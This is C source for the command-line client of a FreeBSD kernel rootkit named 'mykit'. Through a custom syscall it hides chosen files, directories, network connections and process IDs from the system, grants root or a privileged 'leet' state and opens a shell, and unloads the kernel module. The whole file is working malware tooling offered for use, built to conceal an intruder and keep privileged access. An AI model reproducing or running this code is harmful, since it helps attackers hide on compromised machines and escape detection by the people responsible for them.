#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <sys/param.h>
#include <sys/linker.h>
#include <arpa/inet.h>

#include "config.h"

#define mycall(a, b, c, d) syscall(SYS_mycall, a, b, c, d)
#define getroot() mycall(0, NULL, OP_GET_ROOT, NULL)
#define getleet() mycall(0, NULL, OP_GET_LEET, NULL)
#define unleet()  mycall(0, NULL, OP_UNLEET, NULL)

void usage (char *progname)
{
    fprintf(stderr,"Usage: %s [options]\n"
		    "\t-i\t\t\t\t\tReload input conf files\n"
                    "\t-c [hide|unhide]:laddr:lport:fport\tHide a connection\n"
                    "\t-f [hide|unhide]:filename\t\tHide a file or a directory\n"
                    "\t-l\t\t\t\t\tGet leet (and give a shell)\n"
		    "\t-n\t\t\t\t\tUnleet\n"
                    "\t-p [hide|unhide|ghost]:pid\t\t\tHide a pid\n"
                    "\t-r\t\t\t\t\tGet root (and give a shell)\n"
                    "\t-u\t\t\t\t\tUnload mykit\n"
                    "Examples:\n"
                    "\t%s -c hide:0.0.0.0:22:0\n"
                    "\t%s -f unhide:./leetfile\n"
                    "\t%s -p hide:6124\n", progname, progname, progname, progname);
    exit(1);
}

void sig()
{
    printf("mykit not installed\n");
    exit(0);
}

char *StripBlanks(char *paddedstring)
{
    if (paddedstring == NULL)
        return NULL;

    while (*paddedstring == ' ')
        paddedstring++;

     return paddedstring;
}

char *SeperateWord(char *sentence)
{
    if (sentence == NULL)
        return NULL;

    while (*sentence != ':' && *sentence != '\0' && *sentence != '\n')
        sentence++;

    if (*sentence == '\0' || *sentence == '\n') {
        *sentence = '\0';
        return (NULL);
    }

    if (*sentence == ':') {
        *sentence = '\0';
        sentence++;
    }

    return (StripBlanks(sentence));
}

int is_staff_hidden(char *name, int is_file)
{
  FILE *fp;
  if (is_file)
    fp = fopen(sz_hidden_files_filename, "r");
  else
    fp = fopen(sz_hidden_conns_filename, "r");
  char path[256];
  while (!feof(fp))
  {
    fgets(path, 256, fp);
    if (path[strlen(path)-1] == '\n')
      path[strlen(path)-1] = 0;
    if (strcmp(path, name) == 0)
    {
      fclose(fp);
      return 1;
    }
  }
  fclose(fp);
  return 0;
}

void hide_staff(char *name, int is_file)
{
  FILE *fp;
  if (is_file)
    fp = fopen(sz_hidden_files_filename, "a");
  else
    fp = fopen(sz_hidden_conns_filename, "a");
  fputs(name, fp);
  fputs("\n", fp);
  fclose(fp);
}

void unhide_staff(char *name, int is_file)
{
  FILE *fp, *tmp;
  char command[256];
  if (is_file)
    fp = fopen(sz_hidden_files_filename, "r+");
  else
    fp = fopen(sz_hidden_conns_filename, "r+");
  tmp = fopen("/home/mykit/tmp", "w");
  char path[256];
  while (!feof(fp))
  {
    fgets(path, 256, fp);
    if (path[strlen(path)-1] == '\n')
      path[strlen(path)-1] = 0;
    if (strcmp(path, name) != 0)
    {
      fputs(path, tmp);
      fputs("\n", tmp);
    }
  }
  fclose(fp);
  fclose(tmp);
  if (is_file)
    remove(sz_hidden_files_filename);
  else
    remove(sz_hidden_conns_filename);
  if (is_file)
    sprintf(command, "mv /home/mykit/tmp %s", sz_hidden_files_filename);
  else
    sprintf(command, "mv /home/mykit/tmp %s", sz_hidden_conns_filename);
  
  system(command);
}

void parse_conn (char *arg)
{
    char *op, *laddrstr, *lportstr, *fportstr;
    int ret = 0;
    op = arg;
    laddrstr = SeperateWord(op);
    lportstr = SeperateWord(laddrstr);
    fportstr = SeperateWord(lportstr);
    SeperateWord(fportstr);

    if (!op || *op == '\0' ||
        !laddrstr || *laddrstr == '\0' ||
        !lportstr || *lportstr == '\0' ||
        !fportstr || *fportstr == '\0')
        return;

    struct nethide nh;
    nh.laddr = inet_addr(laddrstr);
    nh.lport = htons(strtol(lportstr, NULL, 10));
    nh.fport = htons(strtol(fportstr, NULL, 10));

    char strdesc[50];
    sprintf(strdesc, "%s:%s:%s", laddrstr, lportstr, fportstr);
    
    getleet();
    if (!strcasecmp(op,"hide"))
    {
	if (!is_staff_hidden(strdesc, 0))
	  hide_staff(strdesc, 0);
        ret = mycall(0, &nh, OP_HIDE_CONN, NULL);
    }
    else if (!strcasecmp(op,"unhide"))
    {
	unhide_staff(strdesc, 0);
        ret = mycall(0, &nh, OP_UNHIDE_CONN, NULL);
    }
    else
        printf("%s: invalid argument\n",__func__);

    if (ret)
        perror("mycall");

    free(arg);
}

void parse_file (char *arg)
{
    int fd, ret = 0;
    char *op, *file;
    op = arg;
    file = SeperateWord(op);
    SeperateWord(file);

    if (!op || *op == '\0' ||
        !file || *file == '\0')
        return;

    getleet();
    if ((fd = open(file,O_RDONLY)) == -1) {
        perror("open");
        return;
    }

    if (!strcasecmp(op, "hide"))
    {
      	if (!is_staff_hidden(file, 1))
	  hide_staff(file, 1);
        ret = mycall(fd, NULL, OP_HIDE_FILE, file);
    }
    else if (!strcasecmp(op, "unhide"))
    {
	unhide_staff(file, 1);
        ret = mycall(fd, NULL, OP_UNHIDE_FILE, file);
    }
    else
        printf("%s: invalid argument\n",__func__);
    close(fd);

    if (ret)
        perror("mycall");

    free(arg);
}

void parse_pid (char *arg)
{
    int ret = 0;
    char *op, *pidstr;
    op = arg;
    pidstr = SeperateWord(op);
    SeperateWord(pidstr);

    if (!op || *op == '\0' ||
        !pidstr || *pidstr == '\0')
        return;

    getleet();
    int pid = strtol(pidstr, NULL, 10);

    if (!strcasecmp(op, "hide"))
        ret = mycall(pid, NULL, OP_HIDE_PID, NULL);
    else if (!strcasecmp(op, "unhide"))
        ret = mycall(pid, NULL, OP_UNHIDE_PID, NULL);
    else if (!strcasecmp(op, "ghost"))
        ret = mycall(pid, NULL, OP_GHOST_PID, NULL);
    else
        printf("%s: invalid argument\n",__func__);

    if (ret)
        perror("mycall");

    free(arg);
}

int main (int ac, char **av)
{
    char op;
    int leet = 0,  root = 0, unleet = 0;
    char buf[32];

    if (ac < 2)
        usage(av[0]);

    signal(SIGSYS, sig);

    extern char *optarg;
    while ((op = getopt(ac, av, "c:f:lp:runi")) != EOF) {
        switch(op) {
	    case 'i':
		mycall(0, NULL, OP_RELOAD_CONF, NULL);
		break;
            case 'c':
                parse_conn(strdup(optarg));
                break;
            case 'f':
                parse_file(strdup(optarg));
                break;
            case 'l':
                leet = 1;
                break;
	    case 'n':
		unleet = 1;
		break;
            case 'p':
                parse_pid(strdup(optarg));
                break;
            case 'r':
                root = 1;
                break;
            case 'u':
                getleet();
                mycall(0, NULL, OP_UNHIDEME, NULL);
                int id = kldfind("mykit.ko");
                if (id == -1)
                    break;
                kldunload(id);
                printf("mykit unloaded\n");
		break;
            default:
                usage(av[0]);
        }
    }

    if (leet || root) {
        if (root)
            getroot();
        if (leet)
            getleet();
        execl("/bin/sh","bash",NULL);
    }
    
    if (unleet)
    {
      unleet();
    }

    return 0;
}
